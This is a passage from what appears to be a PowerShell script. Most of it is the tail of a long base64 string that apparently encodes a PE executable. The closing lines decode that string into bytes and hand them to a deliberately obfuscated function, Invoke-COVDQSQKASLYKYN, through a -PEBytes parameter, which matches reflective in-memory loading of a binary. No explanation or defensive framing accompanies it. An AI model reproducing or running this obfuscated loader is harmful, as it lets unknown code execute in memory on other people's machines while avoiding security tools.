gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgECAgQAEgICMwPjBVMGgwMDAwMDAWMTUxMTExMTEQMjJCMl0ydDIyMgUzDzMpM0AzXDMzMzMzMzMzBDQMNBQ0HDQkNCw0NDQ8NEQ0TDRUNFw0ZDRsNHQ0fDQ0NBo1NDVONWg1NTU1NTUMNic2QjZfNjY2CjchNzE3QTdVN2U3dTc3Nzc3NyE4Jjh4ODg4ODg4ODg4OAo5FDknOUY5UDljOTk5OTk5OSA6EDoZOiI6Cjo0Oj06RjpPOljwn4Ww77iPdjp7Ojo6Ojo6OjtPO2s7Ozs8bT19PT09PT09PT09PT09PT0+Vz9xP3k/Pz8gICAgICAgICAZMCYwNTBAMEswUDBqMDAYMSwxPjFLMVcxMTExMTExMSAyMzMzBTQdND00VTQ0NDQ0NA81aDU1UDY2NjZCN2Q3dDc3QTgwOUU5OTk5Lzo6Ojo6OjoFOzs7Ozs7Ozs7DzwWPCI8NTxIPFU8Yjw8Hzs+Uj5nPj4+Pgo/Sj93Pz8/IDAgICAgIA8wQDBnMDAwPDFeMTExMTFGMjIyMjIyAzMzJDQyNDQ0KzVQNTU1NQY2FDYtNjQ2WjZ9NjY2NjY2BDcjN383NzcdOGo4ODg4KjlIOTk5IDoTOh86Mjo7OkY6Yzp2On86Ojo6Mjt2Ozs7Ozs7OzsgPBs8Ljw8PE48UzxdPGI8aDxzPDxzPXw9PT09AT5pPj4+Aj8QPzc/UT8/Pz8/IEAgICAgIEgwYTAwTzFoMXcxMS8yMjIYMzkzMzMJNC80STQ0NDQ0NDQ4NT81TjVSNTU1NTUfNjU2QDZZNjY2NnE3Nzc3NyA4GjhCOFg4fzg4ODg4ODgKORA5FjkmOTk5PzlLOVs5YTl1OTk5OXM7eTs7Ozs7DjwsPGQ8fTw8PDwgPTM9Wj09PVg+az4gICBQICBUICAgMzM0NDg4FjkdOTU5RjlPOTs7FzwzPDg8VTw8PAo9UD05PkA+Rz5OPlU+PmM+Pj4+Pj41P24/Pz8gICBgICAgICAZMGcwMDBMMTExJzJ4MjJbM3QzMzMzdzQ0NDQUNVw1NTUiNkU2NjY2SDdwNzc3Xjg4ODgCOS45XzlsOXU5OTk5OSE6SDpROlg6Ojo6AjsmO0A7UTtuOzs7EDwgcCAgICAgazByMDAzMzMzMzMzMwo0EjQhNDo0STRcNGM0bTQ0NDQ0NDQ0NB01JzUzNUM1UDVXNWQ1cDU1NTU1NTU1NQU2DzYbNjQ2QzZWNl02ZzY2NjY2NhQ3KDc3N2Q3eTc3Nzc3NwU4ODg4OBs5MDlFOVY5Yjk5OQk6HfCfmIM6OTp5Ojo6OjozO0U7O3A7fzs7Ozs7Ljw/PFA8PDwgICAgIAwgICBROCAgICAgDCAgIA80MDUgICAMICAgMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA="
[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
Invoke-COVDQSQKASLYKYN -PEBytes $PEBytes

}
